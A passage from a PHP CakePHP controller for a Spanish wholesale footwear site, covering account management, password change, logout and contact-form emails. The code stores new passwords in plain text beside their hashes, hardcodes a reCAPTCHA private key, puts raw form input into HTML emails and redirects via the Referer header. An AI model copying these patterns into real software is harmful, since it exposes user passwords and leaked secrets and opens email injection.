        $this->redirect("/");
    }
    
    function cliente_index()
    {
       $this->redirect(array('controller'=>'calsados','action'=>'index'));
    }
    function cliente_micuenta()
    {
     
     if(isset($_POST) && !empty($_POST))
     {
        
        $this->Usuario->id=$this->Auth->user("id");       
        $old_p=AuthComponent::password($_POST["old_p"]);
        $p=$this->Usuario->field("password");
        
    
        if($old_p==$p)
        {
            $np = AuthComponent::password($_POST['new_p']);
            $this->Usuario->saveField('contra',$_POST['new_p']);
            $this->Usuario->saveField('password',$np);
            $this->Session->setFlash(___('Password cambiado',1));
        }
        else
        $this->Session->setFlash(___('Password incorrecto',1));
        
     }
     $this->Usuario->recursive = -1;
     $this->Usuario->Consulta->recursive = 1;
     $this->set('usuario', $this->Usuario->read(null, $this->Auth->user('id')));
     $this->set('consultas', $this->Usuario->Consulta->find("all",array("conditions"=>array("Consulta.usuario_delete"=>"0","Consulta.usuario_id"=>$this->Auth->user("id")))));
     $respuestas_no_leidas = $this->Usuario->get_respuesta($this->Auth->user("id"));
     if(!empty($respuestas_no_leidas)){
        foreach($respuestas_no_leidas as $respuesta){
            $this->Usuario->query("UPDATE respuestas SET leido='1' WHERE id={$respuesta['Respuesta']['id']}");
        }
     }
     $this->layout="default";

    } 
    
    function cliente_edit()
    {
       if($this->Auth->user("id"))
       {
         $id=$this->Auth->user("id");
         if (!empty($this->data)) {
        
        $this->data["Usuario"]["id"]=$id;
        $this->data["Usuario"]["title"]=$this->data["Usuario"]["name"]." ".$this->data["Usuario"]["surname"];
        //TODO
        if($this->data["Usuario"]["impuestos"]==1)
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=1;
        }
        else if($this->data["Usuario"]["impuestos"]==2)
        {
            $this->data["Usuario"]["re"]=1;
            $this->data["Usuario"]["iva"]=1;
        }
        else
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=0;
        }
        //si no tiene iva(impuestos) => 0, entonces borramos su nit
        if($this->data["Usuario"]["impuestos"]==0){
            $this->data["Usuario"]["nit"]=NULL;
        }
        //TODO            
        $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
        $this->data["Usuario"]["rol"]="cliente";
       $this->data["Usuario"]["email"]=$this->Auth->user("email");
   //    print_r($this->data);
       
        $this->Usuario->create();
        if($this->data['Usuario']['rol'] != "cliente") $this->redirect($this->referer());
		if ($this->Usuario->save($this->data)) {
				$this->Session->setFlash(___('Se guardaron los datos', true));
				$this->redirect(array('action' => 'micuenta'));
			} else {
				$this->Session->setFlash(___('No se pudo guardar', true));
			}
		}
        else
        {  
            $this->data = $this->Usuario->read(null, $id);
        }
       }
       
       else
       $this->redirect($this->Auth->redirect());
       $this->layout="default";
    }   
    
    
    
    function cliente_logout() {
        $this->loadModel("Userlog");
        $this->data["Userlog"]["usuario_id"]=$this->Auth->user("id");
        $this->data["Userlog"]["operacion"]="logout cliente";
        $this->Userlog->save($this->data);
        
        $this->Userlog->deleteAll(array('Userlog.operacion' =>'logueado','Userlog.usuario_id'=>$this->Auth->user("id")), false);
          
        $this->redirect($this->Auth->logout());
    }
    
    
        function contacto() {
            
            
            App::import('vendor', 'recaptchalib');
            $publickey = "6LffGcoSAAAAAF4Q2-Y3S2yDPvEeCILOQGXdr2bB";
            $privatekey = "6LffGcoSAAAAAEwyd7RB_O8-N65Vnt6p_odnZF-V";
            $resp = recaptcha_check_answer ($privatekey, $_SERVER["REMOTE_ADDR"], $_POST["recaptcha_challenge_field"], $_POST["recaptcha_response_field"]);
            
            if($_POST && $resp->is_valid)
            {
            $mensaje="Nombre:{$_POST["nombre"]} <br/>
            Apellido:{$_POST["apellidos"]}<br/>
            email:{$_POST["email"]}<br/>
            teléfono: {$_POST["telefono"]}<br/>
            Mensaje: {$_POST["comentario"]}";
            
            $mensaje_user="Le informamos que hemos recibido su solicitud de contacto referente a: <br/>".$mensaje.
            "<br><br>Reciba un cordial saludo,<br>El Equipo SpanishWholesale<br>";
            $this->set("mail_news",$mensaje_user);
            
            if(Configure::read('test_mail')){
                $email = Configure::read('test_mail');
            }else{
                $email = trim($_POST["email"]);
            }
            
    		$this->Email->to = $email;
    		$this->Email->subject ="SpanishWholesale - Solicitud de contacto ";
            $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
    		$this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
    		$this->Email->template = 'masivo';
    		$this->Email->sendAs = 'html';
            $this->Email->delivery= 'mail';
    		$this->Email->send();
            /*PARA EL ADMIN*/         
            $this->set("mail_news",$mensaje);            
            $this->Email->to = Configure::read('admin-email');
            $this->Email->subject ="SpanishWholesale - Solicitud de contacto ";
            $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
            $this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
            $this->Email->template = 'masivo';
            $this->Email->sendAs = 'html';
            $this->Email->delivery= 'mail';
            $this->Email->send();
            $_SESSION["okk"]=1;
            }else
            {$_SESSION["err_cap"]=1;}
            header("location:".$_SERVER['HTTP_REFERER']);
            exit();
	}
    
    function contacto2() {
        if($this->Auth->user("id") && $_POST) 
        {
            App::import('Sanitize');
            $mensaje="<b>Consulta:</b><br/> {$_POST["pregunta"]}";
            $this->Usuario->id=$_POST["proveedor"];
            $mensaje_user="Estimado {$this->Usuario->field('title')}, te hicieron una pregunta entra en tu panel de gesti&oacute;n para responder. <br/><br/>".$mensaje.
            "<br><br> ingresar a tu <a target='_blank' href='http://spanishwholesale.com/proveedor/consultas/lista'>panel de gesti&oacute;n</a><br><br>Reciba un cordial saludo,<br>El Equipo SpanishWholesale<br>";
            
            $lang='';
            if(isset($_SESSION["cake_lang"])  &&  $_SESSION["cake_lang"]=='eng') {
                $lang="eng_";
            }
            
            //Nueva consulta
            $this->loadModel("Consulta");
            $this->Consulta->create();
            $consulta["Consulta"]["usuario_id"] = $this->Auth->user("id");
            $consulta["Consulta"]["usuario_prov_id"] = $_POST["proveedor"];
            $consulta["Consulta"]["calsado_id"] = $_POST["calsado"];
            $consulta["Consulta"]["consulta"]= Sanitize::clean($_POST["pregunta"], array('encode' => false,'remove_html' => array('remove'=>true),'escape'=>false,'carriage'=>false));
            $consulta["Consulta"]["tim"] = date("Y-m-d H:i:s");
            
            if($this->Consulta->save($consulta)){
                if(Configure::read('test_mail')){
                    $email = Configure::read('test_mail');
                }else{
                    $email = $this->Usuario->field("email");
                }
                $this->set("mail_news",$mensaje_user);
                $this->Email->to = $email;
                $this->Email->subject ="SpanishWholesale - Consulta de cliente ";
                $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
                $this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
                $this->Email->template = $lang.'masivo';
                $this->Email->sendAs = 'html';
                $this->Email->delivery = 'mail';
                $this->Email->send();
                
                /*PARA EL ADMIN*/
                $this->set("mail_news",$mensaje_user);
                $this->Email->to = Configure::read('admin-email');
                $this->Email->subject ="SpanishWholesale - Consulta de cliente ";
                $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
                $this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
                $this->Email->template = $lang.'masivo';
                $this->Email->sendAs = 'html';
                $this->Email->delivery = 'mail';
                $this->Email->send();
                
                //se envia email y recien redireccionamos
                $this->Session->setFlash(___('Su consulta fue enviada',1));
                $this->redirect($this->referer());
            
            }else{
                $this->Session->setFlash(___('Ocurrio un error al momento del envio, por favor intente de nuevo',1));
                $this->redirect($this->referer());
            }
        
        }else{
            $this->Session->setFlash(___('Debe estar registrado para enviar consultas',1));
            header("location:".$_SERVER['HTTP_REFERER']);
            exit();
        }
	}
}